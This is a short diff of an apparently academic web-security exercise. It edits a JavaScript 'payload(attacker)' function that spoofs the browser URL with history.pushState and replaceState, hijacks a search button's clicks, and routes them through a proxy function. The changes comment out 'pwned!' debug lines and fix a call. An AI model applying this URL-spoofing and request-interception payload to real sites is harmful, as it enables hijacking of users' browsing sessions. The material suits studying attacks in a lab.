@@ -3,7 +3,7 @@
 <script>
 // Extend this function:
 function historyF() {
-	history.pushState(null,null,'http://trurl.cs.illinois.edu/');
+	hist.pushState(null,null,'http://trurl.cs.illinois.edu/');
 }
 function payload(attacker) {
 
@@ -40,7 +40,7 @@ function payload(attacker) {
 				}
 				
 				//testing 
-				$("#query").val("pwned!");
+				//$("#query").val("pwned!");
 			}
 			// no user 
 			else 
@@ -54,7 +54,7 @@ function payload(attacker) {
 				{
 					history.replaceState(null,null,href);
 				}
-				$("#query").val("pwned2!");
+				// $("#query").val("pwned2!");
 			}
 
 			$(/#search-btn/.source).click(function(event)
@@ -85,7 +85,7 @@ function payload(attacker) {
 				//historyF();
 				history.pushState(null,null,href);
 				event.preventDefault();
-				proxy(x)
+				proxy(x);
 			});
 /*
 
